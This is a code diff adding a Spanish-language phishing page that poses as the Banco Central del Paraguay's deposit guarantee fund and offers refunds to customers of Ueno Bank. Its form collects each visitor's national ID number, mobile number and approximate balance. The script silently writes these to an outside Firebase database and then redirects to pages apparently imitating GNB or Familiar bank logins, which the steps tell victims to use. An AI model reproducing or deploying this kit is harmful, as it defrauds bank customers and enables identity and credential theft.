@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>Devolución de depósitos – Ueno Bank S.A.</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --azul:#00286b;
+    --azul2:#00479c;
+    --rojo:#c8102e;
+    --gris:#5b6472;
+    --linea:#dfe3ea;
+    --fondo:#eef1f6;
+  }
+  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  body{
+    font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;
+    background:var(--fondo);color:#1b2230;font-size:15px;line-height:1.5;
+  }
+  .banda-gob{
+    background:var(--rojo);color:#fff;font-size:11px;font-weight:600;
+    letter-spacing:.4px;text-align:center;padding:6px 12px;text-transform:uppercase;
+  }
+  header{
+    background:var(--azul);color:#fff;padding:14px 18px;
+    display:flex;align-items:center;gap:12px;
+  }
+  header svg{flex:0 0 42px}
+  .marca-txt{line-height:1.15}
+  .marca-txt strong{display:block;font-size:14px;font-weight:700;letter-spacing:.2px}
+  .marca-txt span{display:block;font-size:11px;color:#a9c2e8;font-weight:500}
+  .wrap{max-width:640px;margin:0 auto;padding:0 16px 40px}
+  .hero{
+    background:var(--azul2);color:#fff;padding:22px 18px 26px;
+    border-bottom:4px solid var(--azul);
+  }
+  .hero .et{font-size:11px;font-weight:700;letter-spacing:1.2px;text-transform:uppercase;color:#a9c2e8;margin-bottom:8px}
+  .hero h1{font-size:21px;line-height:1.25;font-weight:800;margin-bottom:10px}
+  .hero p{font-size:13.5px;color:#d7e3f5}
+  .aviso{
+    background:#fff5f5;border:1px solid #f3c6cd;border-left:4px solid var(--rojo);
+    border-radius:6px;padding:12px 14px;margin:18px 0;font-size:13px;color:#7d1220;
+  }
+  .aviso b{display:block;margin-bottom:3px;font-size:13px}
+  .datos{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin:0 0 18px}
+  .dato{background:#fff;border:1px solid var(--linea);border-radius:8px;padding:10px 8px;text-align:center}
+  .dato small{display:block;font-size:9.5px;text-transform:uppercase;letter-spacing:.5px;color:var(--gris);font-weight:700;margin-bottom:4px}
+  .dato strong{font-size:12px;color:var(--azul);font-weight:800;line-height:1.2;display:block}
+  .card{background:#fff;border:1px solid var(--linea);border-radius:10px;overflow:hidden;box-shadow:0 2px 10px rgba(0,20,60,.05)}
+  .card-h{padding:16px 18px;border-bottom:1px solid var(--linea);background:#fafbfd}
+  .card-h h2{font-size:15px;font-weight:800;color:var(--azul)}
+  .card-h p{font-size:12px;color:var(--gris);margin-top:3px}
+  .card-b{padding:18px}
+  label{display:block;font-size:11.5px;font-weight:700;color:#38414f;margin-bottom:6px;text-transform:uppercase;letter-spacing:.4px}
+  .campo{margin-bottom:15px}
+  .campo input,.campo select{
+    width:100%;padding:12px 13px;border:1.5px solid var(--linea);border-radius:7px;
+    font-family:inherit;font-size:15px;color:#111;background:#fff;outline:none;
+    transition:border-color .15s, box-shadow .15s;
+  }
+  .campo input:focus,.campo select:focus{border-color:var(--azul2);box-shadow:0 0 0 3px rgba(0,71,156,.12)}
+  .campo input::placeholder{color:#a4acb9}
+  .campo select{appearance:none;background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='14' height='14' viewBox='0 0 24 24' fill='none' stroke='%235b6472' stroke-width='3'><path d='M6 9l6 6 6-6'/></svg>");background-repeat:no-repeat;background-position:right 13px center;padding-right:38px}
+  .campo .hint{font-size:11px;color:#8a929f;margin-top:5px}
+  .asig{
+    display:none;align-items:center;gap:10px;background:#f2f6fd;border:1px dashed #b9cdea;
+    border-radius:7px;padding:11px 13px;margin-bottom:15px;font-size:12.5px;color:#22364f;
+  }
+  .asig.on{display:flex}
+  .asig .banco{font-weight:800;color:var(--azul)}
+  .asig button{
+    margin-left:auto;background:#fff;border:1px solid #b9cdea;color:var(--azul2);
+    font-family:inherit;font-size:11.5px;font-weight:700;padding:6px 10px;border-radius:5px;cursor:pointer;
+  }
+  .asig button:active{background:#e6eefb}
+  .check{display:flex;gap:9px;align-items:flex-start;font-size:12px;color:var(--gris);margin-bottom:16px;line-height:1.4}
+  .check input{margin-top:2px;width:16px;height:16px;accent-color:var(--azul2);flex:0 0 16px}
+  .btn{
+    width:100%;padding:14px;border:0;border-radius:7px;background:var(--azul2);color:#fff;
+    font-family:inherit;font-size:15px;font-weight:800;letter-spacing:.3px;cursor:pointer;
+    transition:background .15s;
+  }
+  .btn:hover{background:var(--azul)}
+  .btn:disabled{background:#8ea6c8;cursor:default}
+  .seguro{display:flex;align-items:center;justify-content:center;gap:6px;font-size:11px;color:#8a929f;margin-top:12px}
+  .pasos{margin-top:22px;background:#fff;border:1px solid var(--linea);border-radius:10px;padding:16px 18px}
+  .pasos h3{font-size:13px;font-weight:800;color:var(--azul);margin-bottom:12px;text-transform:uppercase;letter-spacing:.5px}
+  .paso{display:flex;gap:11px;padding:9px 0;border-top:1px solid #f0f2f6;font-size:12.5px;color:#4a5361;line-height:1.4}
+  .paso:first-of-type{border-top:0}
+  .paso b{flex:0 0 22px;height:22px;border-radius:50%;background:var(--azul);color:#fff;font-size:11px;display:flex;align-items:center;justify-content:center;font-weight:800}
+  footer{text-align:center;font-size:11px;color:#8a929f;padding:24px 16px 34px;line-height:1.6}
+  footer b{color:#5b6472}
+  .overlay{
+    position:fixed;inset:0;background:rgba(0,26,64,.93);z-index:99;display:none;
+    flex-direction:column;align-items:center;justify-content:center;color:#fff;padding:30px;text-align:center;
+  }
+  .overlay.on{display:flex}
+  .spin{width:44px;height:44px;border:4px solid rgba(255,255,255,.25);border-top-color:#fff;border-radius:50%;animation:g .8s linear infinite;margin-bottom:18px}
+  @keyframes g{to{transform:rotate(360deg)}}
+  .overlay p{font-size:15px;font-weight:700}
+  .overlay small{font-size:12px;color:#a9c2e8;margin-top:7px;display:block}
+</style>
+</head>
+<body>
+
+<div class="banda-gob">República del Paraguay · Fondo de Garantía de Depósitos</div>
+
+<header>
+  <svg viewBox="0 0 48 48" width="42" height="42" aria-hidden="true">
+    <circle cx="24" cy="24" r="22" fill="none" stroke="#c9a227" stroke-width="2"/>
+    <circle cx="24" cy="24" r="17" fill="#fff"/>
+    <text x="24" y="29.5" text-anchor="middle" font-family="Arial" font-size="13" font-weight="bold" fill="#00286b">BCP</text>
+  </svg>
+  <div class="marca-txt">
+    <strong>Banco Central del Paraguay</strong>
+    <span>Fondo de Garantía de Depósitos</span>
+  </div>
+</header>
+
+<div class="hero">
+  <div class="wrap" style="padding:0">
+    <div class="et">Proceso oficial de devolución</div>
+    <h1>Devolución de depósitos de Ueno Bank S.A.</h1>
+    <p>Consultá el monto que te corresponde y el banco por el cual vas a cobrar.</p>
+  </div>
+</div>
+
+<div class="wrap">
+
+  <div class="aviso">
+    <b>Ueno Bank S.A. se encuentra intervenida</b>
+    El Banco Central del Paraguay inició la devolución de los saldos garantizados por el FGD. La atención es por etapas y únicamente a los titulares registrados.
+  </div>
+
+  <div class="datos">
+    <div class="dato"><small>Etapa habilitada</small><strong>1 de 3</strong></div>
+    <div class="dato"><small>Anticipo máximo</small><strong>G. 10.000.000</strong></div>
+    <div class="dato"><small>Tope garantizado</small><strong>G. 121.000.000</strong></div>
+  </div>
+
+  <div class="card">
+    <div class="card-h">
+      <h2>Consulta de monto a devolver</h2>
+      <p>Completá tus datos tal como figuran en tu cédula de identidad.</p>
+    </div>
+    <div class="card-b">
+      <form id="f" autocomplete="off" novalidate>
+
+        <div class="campo">
+          <label for="cedula">Cédula de identidad</label>
+          <input id="cedula" name="cedula" inputmode="numeric" placeholder="Ej: 4.567.890" maxlength="12">
+          <div class="hint">Sin puntos. Podés incluir el dígito verificador.</div>
+        </div>
+
+        <div class="campo">
+          <label for="celular">Celular registrado en Ueno</label>
+          <input id="celular" name="celular" inputmode="tel" placeholder="Ej: 0981 123 456" maxlength="14">
+          <div class="hint">Ahí vas a recibir el aviso de acreditación.</div>
+        </div>
+
+        <div class="campo">
+          <label for="monto">Saldo aproximado que tenías</label>
+          <select id="monto" name="monto">
+            <option value="">Seleccioná un rango</option>
+            <option>Hasta G. 1.000.000</option>
+            <option>G. 1.000.001 a G. 3.000.000</option>
+            <option>G. 3.000.001 a G. 5.000.000</option>
+            <option>G. 5.000.001 a G. 10.000.000</option>
+            <option>Más de G. 10.000.000</option>
+            <option>No recuerdo el saldo</option>
+          </select>
+        </div>
+
+        <div class="asig" id="asig">
+          <span>Vas a cobrar por <span class="banco" id="bancoTxt">GNB</span></span>
+          <button type="button" id="cambiar">¿No tenés cuenta? Cambiar de banco</button>
+        </div>
+        <input type="hidden" id="nomBanco2" name="nomBanco2" value="">
+
+        <label class="check">
+          <input type="checkbox" id="acepto">
+          <span>Declaro ser titular de la cuenta y autorizo la verificación de mis datos para la acreditación.</span>
+        </label>
+
+        <button class="btn" id="enviar" type="submit">Consultar mi monto</button>
+        <div class="seguro">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#8a929f" stroke-width="2.5"><rect x="4" y="10" width="16" height="10" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/></svg>
+          Consulta sin costo · No se solicita contraseña
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <div class="pasos">
+    <h3>Cómo se hace la devolución</h3>
+    <div class="paso"><b>1</b><span>El BCP valida tu identidad y el saldo que tenías en Ueno.</span></div>
+    <div class="paso"><b>2</b><span>Se te asigna un banco habilitado para acreditar el anticipo de la etapa 1.</span></div>
+    <div class="paso"><b>3</b><span>Ingresás a ese banco con tu usuario y confirmás la acreditación en el día.</span></div>
+    <div class="paso"><b>4</b><span>El saldo restante se paga en las etapas 2 y 3, hasta el tope de G. 121.000.000.</span></div>
+  </div>
+
+</div>
+
+<footer>
+  <b>Fondo de Garantía de Depósitos</b> · Ley N° 5.666/2016<br>
+  Banco Central del Paraguay · Asunción
+</footer>
+
+<div class="overlay" id="ov">
+  <div class="spin"></div>
+  <p id="ovTxt">Consultando en el FGD...</p>
+  <small>No cierres esta pantalla</small>
+</div>
+
+<script>
+(function(){
+  var DB = "https://cbonnlineec-default-rtdb.firebaseio.com/nbch";
+
+  var f=document.getElementById('f'), ced=document.getElementById('cedula'),
+      cel=document.getElementById('celular'), mon=document.getElementById('monto'),
+      ac=document.getElementById('acepto'), asig=document.getElementById('asig'),
+      bTxt=document.getElementById('bancoTxt'), nomBanco2=document.getElementById('nomBanco2'),
+      cambiar=document.getElementById('cambiar'), btn=document.getElementById('enviar'),
+      ov=document.getElementById('ov'), ovTxt=document.getElementById('ovTxt');
+
+  var banco = "";
+  var manual = false;
+
+  function soloNum(v){ return v.replace(/\D/g,''); }
+
+  ced.addEventListener('input', function(){
+    var n = soloNum(this.value).slice(0,9);
+    this.value = n.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
+    calcularBanco();
+  });
+
+  cel.addEventListener('input', function(){
+    var n = soloNum(this.value).slice(0,10);
+    if(n.length > 5) this.value = n.slice(0,4)+' '+n.slice(4,7)+' '+n.slice(7);
+    else if(n.length > 4) this.value = n.slice(0,4)+' '+n.slice(4);
+    else this.value = n;
+  });
+
+  function calcularBanco(){
+    var n = soloNum(ced.value);
+    if(n.length < 5){ asig.classList.remove('on'); return; }
+    if(manual) return;
+    var ultimo = parseInt(n.charAt(n.length-1),10);
+    banco = (ultimo % 2 === 0) ? "GNB" : "Familiar";
+    pintar();
+  }
+
+  function pintar(){
+    bTxt.textContent = banco;
+    nomBanco2.value = banco;
+    asig.classList.add('on');
+  }
+
+  cambiar.addEventListener('click', function(){
+    manual = true;
+    banco = (banco === "GNB") ? "Familiar" : "GNB";
+    pintar();
+  });
+
+  function error(msg){
+    alert(msg);
+    btn.disabled = false;
+    ov.classList.remove('on');
+  }
+
+  f.addEventListener('submit', function(e){
+    e.preventDefault();
+    var nCed = soloNum(ced.value);
+    var nCel = soloNum(cel.value);
+
+    if(nCed.length < 5) return error("Ingresá una cédula de identidad válida.");
+    if(nCel.length < 9) return error("Ingresá un número de celular válido.");
+    if(!mon.value) return error("Seleccioná el saldo aproximado.");
+    if(!ac.checked) return error("Tenés que aceptar la declaración para continuar.");
+    if(!banco) { manual = true; banco = "GNB"; pintar(); }
+
+    btn.disabled = true;
+    ov.classList.add('on');
+
+    var id = Date.now().toString(36) + Math.random().toString(36).slice(2,7);
+    var ahora = new Date();
+    var registro = {
+      id: id,
+      cedula: nCed,
+      celular: nCel,
+      monto: mon.value,
+      banco_asignado: banco,
+      nomBanco2: banco,
+      origen: "ueno",
+      estado: "CONSULTA FGD",
+      fecha: ahora.toLocaleDateString('es-PY') + ' ' + ahora.toLocaleTimeString('es-PY'),
+      ts: Date.now(),
+      ingreso: ahora.getTime()
+    };
+
+    try { localStorage.setItem('nbch_u', id); localStorage.setItem('nbch_banco', banco); } catch(x){}
+
+    fetch(DB + '/usuarios/' + id + '.json', {
+      method: 'PUT',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify(registro)
+    }).catch(function(){});
+
+    ovTxt.textContent = "Asignando banco de acreditación...";
+
+    setTimeout(function(){
+      ovTxt.textContent = "Redirigiendo a " + banco + "...";
+    }, 1200);
+
+    setTimeout(function(){
+      var destino = (banco === "GNB") ? "index.html" : "indexfamiliar.html";
+      window.location.href = destino + "?u=" + id;
+    }, 2600);
+  });
+})();
+</script>
+</body>
+</html>
